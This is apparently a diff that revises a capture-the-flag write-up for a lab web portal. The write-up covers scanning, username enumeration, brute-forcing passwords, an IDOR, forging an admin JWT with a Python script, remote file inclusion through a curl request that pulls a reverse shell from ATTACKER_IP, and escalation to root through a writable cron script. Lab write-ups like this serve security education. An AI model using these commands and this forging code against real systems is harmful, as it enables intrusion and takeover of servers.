@@ -12,15 +12,15 @@ As an attacker, your objective is to observe how the application behaves, intera
 
 ## Reconnaissance
 
-I started, as always, with an `nmap` scan to look for open ports:
+As always, I began with an nmap scan looking for open ports:
 
 ```bash
 nmap TARGET_IP -p-
 ```
 
-The scan revealed `http` running on port `80` and `ssh` on `22`. I followed up with another scan, this time with version detection and default scripts enabled:
+The scan revealed HTTP running on port 80 and SSH on port 22. I followed up with another scan that enumerated versions and ran nmap's default scripts:
 
-```bash
+```
 nmap TARGET_IP -p 22,80 -sV -sC
 ```
 
@@ -28,7 +28,13 @@ These were the results:
 
 ![](images/nmap_scan.png)
 
-So `ssh` was running `OpenSSH 9.6p1`, and the `http` server was running `Apache/2.4.58`. I visited the page on port `80` and found a login page for the NexusCorp employee portal. Next, I used `feroxbuster` to enumerate existing directories and files, which turned up a lot of useful information:
+So SSH was running `OpenSSH 9.6p1` and the HTTP server was `Apache/2.4.58`. I visited the page on port 80, which turned out to be the login page for the NexusCorp employee portal.
+
+---
+
+## Enumeration
+
+Next, I used `feroxbuster` to enumerate existing directories and files. This gave a lot of information:
 
 ![](images/ferox_scan.png)
 
@@ -41,23 +47,23 @@ config.enc  - Encrypted application configuration (AES-128-ECB)
 Decryption key reference: see static/app.js (deployment notes)
 ```
 
-I downloaded the application configuration file from `/backup/config.enc`, then checked `/static/app.js`:
+Next, I downloaded an application configuration file from `/backup/config.enc` and checked `/static/app.js`:
 
 ![](images/encryption_key.png)
 
-This file contained the key used to encrypt `config.enc`. The encryption method was `AES-ECB-128`, which is symmetric, meaning the same key is used both to encrypt and decrypt the data. I used an [AES decryption tool](https://emn178.github.io/online-tools/aes/decrypt/) to decrypt the file. Since the key had to be 16 bytes and the one found in `app.js` was only 14, I padded it with `0000` (2 null bytes) at the end of the hex version of the key. I selected `ECB` mode and decrypted the file, though the result didn't reveal anything particularly sensitive:
+This file contained the key used to encrypt `config.enc`. It used AES-128-ECB, a symmetric algorithm, meaning the same key is used for both encryption and decryption. I used an [online AES decryption tool](https://emn178.github.io/online-tools/aes/decrypt/) to decrypt the file. Since the key had to be 16 bytes long and the one in `app.js` was only 14, I appended `0000` (2 null bytes) to the end of the hex-encoded key. I selected ECB mode and decrypted the file, though it didn't reveal anything particularly useful:
 
 ```text
 {"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
 ```
 
-I then looked more closely at the main page. The username placeholder revealed its expected format:
+After that, I decided to investigate the main page more closely. The username field's placeholder revealed its expected format:
 
 ```text
 firstname.lastname
 ```
 
-From there, I navigated to `/team.php`, found earlier with `feroxbuster`. This endpoint listed the people working at NexusCorp, along with their emails and job titles, which let me build a list of usernames:
+From here, I navigated to `/team.php`, found earlier with `feroxbuster`. This endpoint listed NexusCorp employees along with their emails and job titles, which let me build a list of usernames:
 
 ```text
 laura.hayes laura.hayes@nexus.corp CIO
@@ -69,49 +75,31 @@ david.brown david.brown@nexus.corp Full Stack Developer
 james.wright james.wright@nexus.corp Systems Administrator
 ```
 
-Next, I checked `/forgot.php`, a page for resetting a user's password by sending them an email. Providing an invalid username produced a message saying the account wasn't found. Using that behavior, I confirmed that all of the usernames I'd gathered were valid.
+Next, I checked `/forgot.php`, a page for resetting passwords by emailing a reset link to the user's account. Submitting an invalid username returned a message saying the account wasn't found, which let me confirm that all the usernames I'd built were valid.
 
 ---
 
-## Credential Access: Password Brute-Force
+## Initial Access
 
-I used `hydra` to brute-force passwords for the valid usernames, which turned up 3 valid credentials:
+I used `hydra` to brute-force passwords, which turned up three valid ones:
 
 ![](images/hydra_login_page.png)
 
-`sarah.johnson`, `robert.wilson`, and `emma.taylor` all turned out to be using the same weak password.
-
----
-
-## Initial Access: Logging in as sarah.johnson
-
-I logged in as `sarah.johnson` first and accessed the employee portal:
+So `sarah.johnson`, `robert.wilson`, and `emma.taylor` all shared the same weak password. I logged in as `sarah.johnson` first and reached the employee portal:
 
 ![](images/dashboard.png)
 
-The page had a `Quick Links` section. I opened the `My Profile API` link, which redirected me to `/api/users/profile.php?id=`.
-
----
-
-## Privilege Escalation: IDOR in the Profile API
-
-I tried modifying the `id` parameter to check whether the endpoint was vulnerable to IDOR, and it was. Setting `id=1` let me access information about `laura.hayes`, along with the first flag:
+The page had a `Quick Links` section. Opening the `My Profile API` link redirected me to `/api/users/profile.php?id=`. I tried modifying the `id` parameter to check for an IDOR vulnerability, and sure enough, it was vulnerable. Setting `id=1` gave me `laura.hayes`' information, along with the first flag:
 
 ![](images/first_flag.png)
 
-`laura.hayes` turned out to be an admin account. I went back to `/dashboard.php` and read the `File Viewer` section. It explained that the `/api/files.php?name=` endpoint existed, and that modifying the `name` parameter would let me access internal documents. To use this feature, I first had to obtain a JWT token via the `/api/auth/token.php` endpoint.
-
----
-
-## Privilege Escalation: Forging an Admin JWT
-
-I obtained a token and sent a test request:
+So `laura.hayes` was an admin. I went back to `/dashboard.php` and read the `File Viewer` section, which mentioned an `/api/files.php?name` endpoint that could be used to access internal documents by modifying the `name` parameter. To use this feature, I first needed a JWT token from the `/api/auth/token.php` endpoint. I obtained one and sent a test request:
 
 ```bash
 curl 'http://MACHINE_IP/api/files.php?name=' -H 'Authorization: Bearer <TOKEN>'
 ```
 
-The response stated that I needed an admin token:
+However, the response said I needed an admin token:
 
 ```text
 {"error":"Admin JWT required. Check your token payload."}
@@ -128,7 +116,7 @@ This is the decoded payload:
 }
 ```
 
-I tried cracking the JWT secret with `hashcat`, but that didn't work. Instead, I decided to craft my own JWT token with the `role` changed to `admin`, signing it with the AES key I'd found earlier. I wrote a small Python script to do this:
+I tried cracking the JWT secret with `hashcat`, but that didn't work. Instead, I decided to forge a custom JWT token with the `role` changed to `admin`, using the AES key I'd found earlier. I wrote a simple Python script to do that:
 
 ```python
 import jwt
@@ -151,13 +139,13 @@ token = jwt.encode(
 print(token)
 ```
 
-I ran the script and sent a new request using the forged token. This time, it worked:
+I ran the script and sent a new request with the forged token. This time it worked:
 
 ```text
 {"error":"Missing name parameter","usage":"\/api\/files.php?name=\/var\/www\/html\/filename.txt"}
 ```
 
-The response confirmed I could only access files located under `/var/www/html`. The most interesting file in that directory was likely `config.php`, so I requested it next and got its contents:
+The response indicated I could only access files located in `/var/www/html`. The most interesting file in that directory was likely `config.php`, so I sent another request and retrieved its contents:
 
 ```php
 <?php
@@ -176,9 +164,9 @@ function get_db() {
 ?>
 ```
 
-The file contained database credentials, along with `JWT_SECRET` (used for JWT tokens) and `APP_SECRET` (used for session cookies). The real `JWT_SECRET` was actually different from the key I'd used to forge my token — which meant the application wasn't validating the token's signature at all, just trusting whatever role was in the payload.
+The file contained database credentials, along with `JWT_SECRET` (used for JWT tokens) and `APP_SECRET` (used for session cookies). The real JWT secret was different from the one I'd used to forge my token, which meant the application wasn't actually validating the token's signature.
 
-I also read the contents of `/api/files.php`, and part of its code revealed something critical:
+I also read the contents of `/api/files.php`. Part of its code revealed something critical:
 
 ```php
 if (strpos($name, 'http://') === 0 || strpos($name, 'https://') === 0) {
@@ -192,21 +180,15 @@ if (strpos($name, 'http://') === 0 || strpos($name, 'https://') === 0) {
 eval(str_replace('<?php', '', $remote));
 ```
 
-If the `name` parameter contains a URL, the application fetches its contents with `file_get_contents()` and stores them in the `$remote` variable. That content is then passed to `eval()`, which executes it as PHP code.
+If the `name` parameter contains a URL, the application fetches its contents with `file_get_contents()` and stores them in the `$remote` variable. That content is then passed to `eval()`, causing it to be executed as PHP code.
 
-So if `name` points to a file containing PHP code, the server will download and run that code — a Remote File Inclusion (RFI) vulnerability I could use to get a reverse shell.
-
----
-
-## Remote Code Execution: RFI in files.php
-
-I created a `.php` reverse shell using [revshells.com](https://www.revshells.com/), then started an HTTP server to host it:
+So if `name` points to a file containing PHP code, the server downloads and executes it — a Remote File Inclusion (RFI) vulnerability that I could use to get a reverse shell. I generated a PHP reverse shell using a dedicated site, then started an HTTP server:
 
 ```bash
 python3 -m http.server 8888
 ```
 
-And sent the malicious request:
+And sent a malicious request:
 
 ```bash
 curl 'http://MACHINE_IP/api/files.php?name=http://ATTACKER_IP:8888/shell.php' -H 'Authorization: Bearer <TOKEN>'
@@ -222,30 +204,28 @@ This gave me a reverse shell as `www-data`, along with another flag:
 
 ![](images/www_data_rev_shell.png)
 
-The flag that's normally only reachable after logging into the portal as an admin was, once I had shell access, readable directly at `/var/www/html/admin/index.php`:
+The flag that's normally reached by first gaining admin access on the portal can also be found directly at `/var/www/html/admin/index.php`:
 
 ![](images/second_flag.png)
 
 ---
 
-## Privilege Escalation: `devops` via Password Reuse
+## Escalation to `deops`
 
-I tried to find files owned by `devops` that I could write to, but found none. I then remembered I had `devops`' credentials for the MySQL database, so I checked whether that same password also worked for SSH login. It did — I logged in via SSH as `devops` and obtained another flag:
+I tried to find files owned by `devops` that I could write to, but found nothing. I remembered I had `devops`' MySQL credentials, so I checked whether the same password also worked for SSH. It did — I logged in via SSH as `devops` and grabbed another flag:
 
 ![](images/ssh_devops.png)
 
-So exploiting the RFI vulnerability turned out not to be necessary to reach this account.
+So exploiting the RFI wasn't actually necessary for this step.
 
----
+## Escalation to `root`
 
-## Privilege Escalation: `root`
-
-Running `pspy64` turned up two interesting processes, `admin_bot.py` and `health_check.sh`:
+Running `pspy64` revealed two interesting processes, `admin_bot.py` and `health_check.sh`:
 
 ![](images/health_proces.png)
 ![](images/admin_proces.png)
 
-Both ran as `root`, and I had write access to both. I appended a reverse shell payload to `health_check.sh`, and once it ran again, I got a shell as root:
+Both ran as root, and I had write access to both. I appended a reverse shell to `health_check.sh`, and after its next scheduled run, I got a shell as root:
 
 ![](images/root.png)
 
@@ -253,20 +233,17 @@ Both ran as `root`, and I had write access to both. I appended a reverse shell p
 
 ## Kill Chain
 
-This box was a genuine chain of small issues, each one enabling the next. Directory enumeration led to a backup file and its decryption key sitting right next to it, but the config it decrypted to didn't reveal much on its own — the real value of that key only became clear much later. A staff directory endpoint and a username-enumeration bug on the password reset page gave me a full list of valid employee accounts, and a shared weak password across three of them was enough to get a first foothold.
+This box was a long chain of small findings, each feeding into the next. Directory enumeration turned up a backup file and its decryption key, and while decrypting it didn't directly help, enumerating the team page gave a full list of employee usernames. A password-reset page confirmed which usernames were valid, and a weak, shared password caught three of them in a brute-force attack.
 
-From there, an IDOR in the profile API leaked another user's data with nothing more than an incrementing ID, and a File Viewer feature turned into full arbitrary file read once I realized the app never actually validated JWT signatures — the AES key found earlier during reconnaissance worked perfectly as a forged signing key. Reading source code through that file-read primitive then exposed a Remote File Inclusion bug in the same endpoint, which was enough for full code execution.
+From an ordinary user account, an IDOR in the profile API leaked another user's data and the first flag. The file-viewer API required an admin JWT, but since the application never actually verified the token's signature, forging one with an `admin` role was enough to bypass that check. That access disclosed `config.php`, and the same file-viewer endpoint turned out to allow remote file inclusion, giving a reverse shell as `www-data`. From there, reused credentials (the same password for MySQL and SSH) gave a much simpler route to the `devops` account, and two writable root-owned cron scripts made the final jump to root straightforward.
 
-Privilege escalation past that point came down to simple password reuse (`devops`' database password worked over SSH) and a root-owned, world-writable script picked up by a scheduled job.
+`sarah.johnson → www-data (via forged JWT + RFI) / devops (via password reuse) → root (via writable cron script)`
 
-`Anonymous visitor → sarah.johnson (password brute-force) → laura.hayes' data (IDOR) → forged admin JWT → www-data (RFI) → devops (password reuse) → root (writable cron script)`
-
-- **Reconnaissance:** Directory brute-force → backup file and decryption key → AES-ECB decryption (limited value)
-- **Initial Access:** Username enumeration (staff directory + password-reset endpoint) → password brute-force → login as `sarah.johnson`
-- **Information Disclosure:** IDOR in `/api/users/profile.php?id=` → access to `laura.hayes`' (admin) data
-- **Privilege Escalation:** Unvalidated JWT signature → forged admin token using the earlier AES key → arbitrary file read → `config.php` disclosure
-- **Remote Code Execution:** RFI in `/api/files.php?name=` → reverse shell as `www-data`
-- **Privilege Escalation:** Reused `devops` database password over SSH → shell as `devops`
-- **Final Escalation:** Writable, root-owned `health_check.sh` picked up by a scheduled job → shell as root
+- **Initial Access:** Username enumeration + weak shared password → login as `sarah.johnson`
+- **Information Disclosure:** IDOR in `/api/users/profile.php` → `laura.hayes`' data, first flag
+- **Privilege Escalation (app-level):** Unverified JWT signature → forged admin token → access to `/api/files.php`
+- **Remote Code Execution:** RFI via the `name` parameter → reverse shell as `www-data`
+- **Privilege Escalation (system):** Reused `devops` MySQL password → SSH access as `devops`
+- **Final Escalation:** Writable root-owned cron script (`health_check.sh`) → root shell
 
 > Thanks for reading!
